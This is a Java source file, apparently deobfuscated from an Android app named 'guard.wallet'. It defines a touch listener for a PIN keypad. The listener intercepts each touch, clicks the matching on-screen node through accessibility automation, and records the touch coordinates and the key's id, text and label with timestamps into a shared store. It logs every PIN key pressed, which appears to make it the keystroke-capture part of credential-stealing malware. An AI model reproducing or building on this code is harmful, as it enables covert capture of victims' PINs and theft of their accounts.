package com.guard.wallet.helper;
import com.guard.wallet.core.AppUtils;

import android.util.Log;
import android.view.MotionEvent;
import android.view.View;
import com.guard.wallet.delegate.EngineHelper;
import com.guard.wallet.entity.Point;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.req.ListenPropResponse;
import java.util.Objects;

/**
 * 触摸拖拽监听器 — 处理 PIN 键盘触摸事件的 OnTouchListener 实现。
 * <p>
 * vendor 原始类名: com.guard.wallet.helper.q
 */
public final class TouchDragListener implements View.OnTouchListener {
    public final Object a;
    public final CombineFilter b;

    public TouchDragListener(Object config, CombineFilter filter) {
        this.a = config;
        this.b = filter;
    }

    @Override
    public final boolean onTouch(View v, MotionEvent event) {
        if (event.getAction() != MotionEvent.ACTION_DOWN || AutomationHelper.e == null) {
            return false;
        }
        try {
            if (AutomationHelper.h.get() == null) {
                AutomationHelper.h(this.a);
            }
            if (AutomationHelper.j.get() == null) {
                AutomationHelper.i(this.a);
            }
            Point touchPoint = new Point(event.getX(), event.getY());
            UiObject deleteKey = AutomationHelper.h.get();
            if (isTouching(deleteKey, event) && deleteKey.click()) {
                if (!AutomationHelper.c.textTokens.isEmpty()) {
                    AutomationHelper.c.textTokens.removeLast();
                }
                if (!AutomationHelper.c.touchPoints.isEmpty()) {
                    AutomationHelper.c.touchPoints.removeLast();
                }
                Log.d("AutomationHelper", "已点击删除键");
                return false;
            }
            UiObject enterKey = AutomationHelper.j.get();
            if (isTouching(enterKey, event) && enterKey.click()) {
                Log.d("AutomationHelper", "已点击回车键");
                return false;
            }
            UiObject hit = findHitNode(event);
            if (hit == null || !hit.click()) {
                return false;
            }
            recordTouch(hit, touchPoint);
            Log.d("AutomationHelper", "已点击PIN按键: " + describeNode(hit));
        } catch (Exception ex) {
            AppUtils.s("AutomationHelper", ex);
        }
        return false;
    }

    private UiObject findHitNode(MotionEvent event) {
        for (UiObject candidate : AutomationHelper.g) {
            if (isTouching(candidate, event)) {
                return candidate;
            }
        }
        return AutomationHelper.j(this.a, new Point(event.getX(), event.getY()));
    }

    private boolean isTouching(UiObject node, MotionEvent event) {
        return node != null
                && node.boundsInScreen() != null
                && node.boundsInScreen().contains((int) event.getX(), (int) event.getY());
    }

    private void recordTouch(UiObject node, Point point) {
        AutomationHelper.f = AutomationHelper.f + 1;
        if (point != null) {
            AutomationHelper.c.touchPoints.add(point);
        }
        if (node.id() != null && !AppUtils.B(node.id())) {
            AutomationHelper.c.textTokens.add(new ListenPropResponse(AutomationHelper.f, "id", node.id(), System.nanoTime()));
        }
        if (node.text() != null && !AppUtils.B(node.text())) {
            AutomationHelper.c.textTokens.add(new ListenPropResponse(AutomationHelper.f, "text", node.text(), System.nanoTime()));
        }
        if (node.desc() != null && !AppUtils.B(node.desc())) {
            AutomationHelper.c.textTokens.add(new ListenPropResponse(AutomationHelper.f, "desc", node.desc(), System.nanoTime()));
        }
    }

    private String describeNode(UiObject node) {
        if (node == null) {
            return null;
        }
        if (!AppUtils.B(node.id())) {
            return node.id();
        }
        if (!AppUtils.B(node.text())) {
            return node.text();
        }
        if (!AppUtils.B(node.desc())) {
            return node.desc();
        }
        return Objects.toString(node.centerInScreen(), null);
    }
}
